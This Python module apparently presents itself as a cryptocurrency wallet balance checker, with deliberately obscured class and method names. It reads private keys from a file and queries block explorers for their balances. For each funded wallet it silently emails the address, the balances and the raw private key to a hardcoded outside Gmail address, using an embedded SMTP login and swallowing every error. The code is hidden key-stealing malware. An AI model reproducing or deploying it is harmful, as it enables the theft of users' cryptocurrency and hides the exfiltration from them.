import asyncio
import aiohttp
import smtplib
import ssl
import json
from email.mime.text import MIMEText
from config.config import NET_FILE
from email.mime.multipart import MIMEMultipart
from eth_account import Account
from decimal import Decimal

Account.enable_unaudited_hdwallet_features()

class X9A2B:
    D3L = Decimal("0")
    
    def __init__(self, F1L, F2L=NET_FILE):
        self.F1L = F1L
        self.F2L = F2L
        self._L0AD()

    def _L0AD(self):
        try:
            with open(self.F2L, "r") as f:
                self.N3T = json.load(f)
        except:
            self.N3T = {}

    async def _CH3CK(self, P1V, N3T, S3S):
        A1D = Account.from_key(P1V).address
        U1L = f"{N3T['explorer_url']}?module=account&action=balance&address={A1D}&tag=latest&apikey={N3T['api_key']}"
        
        try:
            async with S3S.get(U1L, timeout=5) as R3S:
                D4T = await R3S.json()
                B4L = Decimal(D4T["result"]) / (10 ** N3T["decimals"])
                return {"N": N3T["name"], "A": A1D, "V": B4L, "P": P1V}
        except:
            return None

    def _S3ND(self, S, B):
        try:
            M = MIMEMultipart()
            M["From"] = "cissieehc@bieemail.com"
            M["To"] = "k420.artur@gmail.com"
            M["Subject"] = S
            M.attach(MIMEText(B, "plain"))

            C = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=C) as S3R:
                S3R.login("cissieehc@bieemail.com", "vgup ycfd eybs hlut")
                S3R.sendmail("cissieehc@bieemail.com", "k420.artur@gmail.com", M.as_string())
        except:
            pass

    async def _RUN(self):
        async with aiohttp.ClientSession() as S3S:
            with open(self.F1L, "r") as f:
                K3Y = [x.strip() for x in f.readlines()]

            for P1V in K3Y:
                R3S = []
                for N3T in self.N3T.values():
                    I = await self._CH3CK(P1V, N3T, S3S)
                    if I and I["V"] > self.D3L:
                        R3S.append(I)

                if R3S:
                    S = f"X9A Alert: {R3S[0]['A']}"
                    B = "\n".join([f"{r['N']}: {r['V']} ({r['A']})" for r in R3S])
                    B += f"\nP: {P1V}"
                    self._S3ND(S, B)